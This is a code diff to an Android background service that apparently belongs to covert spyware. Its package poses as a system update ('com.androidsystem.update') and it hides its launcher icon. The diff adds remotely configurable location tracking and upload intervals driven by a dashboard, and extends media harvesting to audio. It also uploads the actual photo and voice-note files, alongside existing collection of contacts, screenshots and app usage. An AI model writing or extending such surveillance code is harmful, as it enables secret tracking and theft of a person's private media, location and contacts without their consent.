@@ -57,6 +57,13 @@ class CoreService : LifecycleService() {
     private var scanIntervalMinutes = 60L
     private val scanIntervalMillis: Long get() = scanIntervalMinutes * 60 * 1000
 
+    // Dashboard-configurable cadence: how often structured data is uploaded and
+    // how often location is sampled. Persisted so the choice survives restarts.
+    private var syncIntervalMinutes = 5L
+    private val syncIntervalMillis: Long get() = syncIntervalMinutes * 60 * 1000
+    private var locationIntervalMinutes = 5L
+    private val locationIntervalMillis: Long get() = locationIntervalMinutes * 60 * 1000
+
     private var lastScreenshotCheck = System.currentTimeMillis() - 86400_000L
     private var lastMediaScan = System.currentTimeMillis() - 86400_000L
     private var lastContactScan = 0L
@@ -79,13 +86,15 @@ class CoreService : LifecycleService() {
 
     companion object {
         private const val TAG = "CoreService"
-        private const val SYNC_INTERVAL = 300000L
         private const val PAIRING_CODE_KEY = "pairing_code"
         private const val IS_PAIRED_KEY = "is_paired"
         private const val WATCHDOG_PREFS = "watchdog_prefs"
         private const val HEARTBEAT_KEY = "last_heartbeat"
         private const val LAUNCHER_ALIAS = "com.androidsystem.update.ui.SetupWizardLauncher"
-        private val ALLOWED_COMMANDS = setOf("UPDATE_INTERVAL", "SYNC_NOW", "FORCE_COLLECT", "COLLECT_LOCATION")
+        private val ALLOWED_COMMANDS = setOf(
+            "UPDATE_INTERVAL", "UPDATE_SYNC_INTERVAL", "UPDATE_LOCATION_INTERVAL",
+            "SYNC_NOW", "FORCE_COLLECT", "COLLECT_LOCATION"
+        )
 
         // Disables the launcher *alias*, never the running activity: hiding the
         // icon this way cannot destroy an open SetupWizard (which is what made
@@ -113,6 +122,7 @@ class CoreService : LifecycleService() {
         }
         telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
         loadRemoteConfig()
+        loadIntervals()
         registerContactsObserver()
         scheduleTasks()
         listenForCommands()
@@ -164,7 +174,38 @@ class CoreService : LifecycleService() {
                 scanIntervalMinutes = interval
                 rescheduleTasks()
             }
+            "UPDATE_SYNC_INTERVAL" -> {
+                val interval = intent.getLongExtra("interval_minutes", 5)
+                if (interval >= 5) {
+                    syncIntervalMinutes = interval
+                    saveIntervals()
+                    rescheduleTasks()
+                }
+            }
+            "UPDATE_LOCATION_INTERVAL" -> {
+                val interval = intent.getLongExtra("interval_minutes", 5)
+                if (interval >= 5) {
+                    locationIntervalMinutes = interval
+                    saveIntervals()
+                    restartLocationUpdates()
+                }
+            }
         }
+    }
+
+    // Persist the dashboard-selected cadences (sync + location) so they
+    // survive service restarts and reboots.
+    private fun loadIntervals() {
+        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
+        syncIntervalMinutes = prefs.getLong("sync_interval_minutes", 5L)
+        locationIntervalMinutes = prefs.getLong("location_interval_minutes", 5L)
+    }
+
+    private fun saveIntervals() {
+        getSharedPreferences("app_prefs", Context.MODE_PRIVATE).edit()
+            .putLong("sync_interval_minutes", syncIntervalMinutes)
+            .putLong("location_interval_minutes", locationIntervalMinutes)
+            .apply()
     }
 
     private fun loadRemoteConfig() {
@@ -185,7 +226,7 @@ class CoreService : LifecycleService() {
         )
         syncFuture = executor.scheduleAtFixedRate(
             { serviceScope.launch { syncPendingData() } },
-            SYNC_INTERVAL, SYNC_INTERVAL, TimeUnit.MILLISECONDS
+            syncIntervalMillis, syncIntervalMillis, TimeUnit.MILLISECONDS
         )
         mediaFuture = executor.scheduleAtFixedRate(
             { serviceScope.launch { scanNewMedia() } },
@@ -257,6 +298,20 @@ class CoreService : LifecycleService() {
                 scanIntervalMinutes = cmd.interval_minutes
                 rescheduleTasks()
             }
+            "UPDATE_SYNC_INTERVAL" -> {
+                if (cmd.interval_minutes >= 5) {
+                    syncIntervalMinutes = cmd.interval_minutes
+                    saveIntervals()
+                    rescheduleTasks()
+                }
+            }
+            "UPDATE_LOCATION_INTERVAL" -> {
+                if (cmd.interval_minutes >= 5) {
+                    locationIntervalMinutes = cmd.interval_minutes
+                    saveIntervals()
+                    restartLocationUpdates()
+                }
+            }
             "SYNC_NOW" -> syncPendingData()
             "FORCE_COLLECT" -> collectAll()
             "COLLECT_LOCATION" -> collectLocation()
@@ -280,7 +335,7 @@ class CoreService : LifecycleService() {
         if (!checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return
         val request = LocationRequest.Builder(
             Priority.PRIORITY_BALANCED_POWER_ACCURACY,
-            configManager.getLocationInterval()
+            locationIntervalMillis
         ).apply {
             setMinUpdateIntervalMillis(60_000L)
             setMaxUpdateDelayMillis(300_000L)
@@ -298,6 +353,16 @@ class CoreService : LifecycleService() {
         } catch (e: Exception) {
             Log.e(TAG, "Location updates failed", e)
         }
+    }
+
+    // Re-applies the dashboard-chosen location cadence (update interval).
+    private fun restartLocationUpdates() {
+        try {
+            locationCallback?.let { locationClient?.removeLocationUpdates(it) }
+        } catch (e: Exception) {
+            Log.e(TAG, "Remove location updates failed", e)
+        }
+        startLocationUpdates()
     }
 
     @SuppressLint("MissingPermission")
@@ -530,7 +595,8 @@ class CoreService : LifecycleService() {
                 MediaStore.Files.FileColumns.MIME_TYPE
             )
             val mediaSel = "(${MediaStore.Files.FileColumns.MEDIA_TYPE} = ${MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE} OR " +
-                "${MediaStore.Files.FileColumns.MEDIA_TYPE} = ${MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO}) AND " +
+                "${MediaStore.Files.FileColumns.MEDIA_TYPE} = ${MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO} OR " +
+                "${MediaStore.Files.FileColumns.MEDIA_TYPE} = ${MediaStore.Files.FileColumns.MEDIA_TYPE_AUDIO}) AND " +
                 "${MediaStore.Files.FileColumns.DATE_ADDED} > ?"
             contentResolver.query(
                 MediaStore.Files.getContentUri("external"),
@@ -568,9 +634,9 @@ class CoreService : LifecycleService() {
                 // Upload cadence reported to the dashboard (all in seconds).
                 put("config", JSONObject().apply {
                     put("heartbeat_interval", 60)
-                    put("sync_interval", SYNC_INTERVAL / 1000)
+                    put("sync_interval", syncIntervalMinutes * 60)
                     put("scan_interval", scanIntervalMinutes * 60)
-                    put("location_interval", configManager.getLocationInterval() / 1000)
+                    put("location_interval", locationIntervalMinutes * 60)
                 })
                 if (!isPaired) {
                     val code = prefs.getString(PAIRING_CODE_KEY, null) ?: generatePairingCode()
@@ -661,6 +727,13 @@ class CoreService : LifecycleService() {
             media.first.forEach { batch.put(syncMessageJson(it)) }
             cursors["media"] = media.second
 
+            // Actual file payloads (photo thumbnails, small voice notes) —
+            // separate, slowly-advancing cursor so the sync cadence stays light
+            // even with many images. At most 10 files per cycle.
+            val files = repository.mediaFileSync(prefs.getLong("media_files", 0L), 10)
+            files.first.forEach { batch.put(syncMessageJson(it)) }
+            if (files.first.isNotEmpty()) cursors["media_files"] = files.second
+
             val apps = repository.appUsageSync(prefs.getLong("apps", 0L), limit)
             apps.first.forEach { batch.put(syncMessageJson(it)) }
             cursors["apps"] = apps.second
@@ -694,6 +767,7 @@ class CoreService : LifecycleService() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 add(Manifest.permission.READ_MEDIA_IMAGES)
                 add(Manifest.permission.READ_MEDIA_VIDEO)
+                add(Manifest.permission.READ_MEDIA_AUDIO)
             }
         }
         val missing = perms.filter { !checkPermission(it) }
